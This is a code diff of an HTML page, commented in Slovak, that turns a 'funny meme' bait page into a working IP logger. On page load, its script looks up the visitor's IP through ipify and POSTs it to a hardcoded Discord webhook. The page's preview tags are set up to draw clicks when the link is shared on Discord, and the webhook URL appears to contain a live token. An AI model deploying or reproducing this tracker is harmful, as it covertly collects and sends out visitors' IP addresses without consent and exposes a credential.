@@ -1,19 +1,52 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sk">
 <head>
-  <meta charset="UTF-8">
-  <title>This image is fake 😎</title>
+  <meta charset="UTF-8" />
+  <title>IP Logger s webhookom</title>
 
-  <!-- Open Graph tag for Discord preview -->
-  <meta property="og:title" content="Funny Meme">
-  <meta property="og:description" content="Check out this hilarious meme! 😂">
-  <meta property="og:image" content="https://your-site.com/fake-image.jpg">
+  <!-- Open Graph meta tagy pre pekný náhľad v Discord -->
+  <meta property="og:title" content="Super IP Logger stránka" />
+  <meta property="og:description" content="Táto stránka zaznamená tvoju IP a pošle ju na webhook." />
+  <meta property="og:image" content="https://tvoj-web.github.io/obrazok.png" />
+  <meta property="og:url" content="https://tvoj-web.github.io" />
+  <meta property="og:type" content="website" />
 
-  <!-- Optional -->
-  <meta name="twitter:card" content="summary_large_image">
+  <!-- Twitter card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Super IP Logger stránka" />
+  <meta name="twitter:description" content="Táto stránka zaznamená tvoju IP a pošle ju na webhook." />
+  <meta name="twitter:image" content="https://tvoj-web.github.io/obrazok.png" />
 </head>
 <body>
-  <h1>This image is broken on purpose 😏</h1>
-  <img src="fake-image.jpg" alt="broken" />
+  <h1>IP Logger</h1>
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1403164786426122280/Qr-LlmfaJTRDq6OkG4SZ0VLAb_z0SEZKtdvNaDtOwEmo_u7wkalQjiwdJTNSLnxtTR5z";
+
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        console.log("IP návštevníka:", ip);
+
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `Nový návštevník so záznamom IP: ${ip}`
+          }),
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log("IP poslaná na webhook");
+          } else {
+            console.error("Chyba pri posielaní na webhook");
+          }
+        })
+        .catch(console.error);
+      })
+      .catch(console.error);
+  </script>
 </body>
 </html>
